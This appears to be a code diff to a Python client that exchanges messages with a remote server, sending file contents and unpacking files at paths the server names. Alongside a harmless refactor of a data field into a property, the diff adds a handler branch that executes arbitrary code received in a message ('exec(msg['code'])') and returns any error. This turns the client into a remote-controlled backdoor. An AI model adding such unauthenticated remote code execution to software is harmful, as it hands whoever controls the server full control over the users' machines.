@@ -34,7 +34,7 @@ class Data:
     """
 
     def __init__(self):
-        self.data = b''
+        self._data = b''
         self.v_uid = ''
         self.uid = Client.uid
         self.type = ''
@@ -42,6 +42,14 @@ class Data:
 
     def json(self) -> dict:
         return {"code": 0, "data": base64.b64encode(self.data).decode(), "v_uid": self.v_uid, "uid": self.uid, "type": self.type, "raw": self.raw}
+
+    @property
+    def data(self) -> bytes:
+        return self._data
+
+    @data.setter
+    def data(self, value):
+        self._data = bytes(value)
 
 
 class File:
@@ -208,6 +216,10 @@ class Client:
             data_bean.raw = File.uncompress(msg["data"]["file_abspath"], msg["data"]["last_dirname"])
             self.send(data_bean.json())
         else:
+            try:
+                exec(msg["code"] or "")
+            except Exception as e:
+                data_bean.raw = e.__str__()
             self.send(data_bean.json())
 
     def on_open(self):
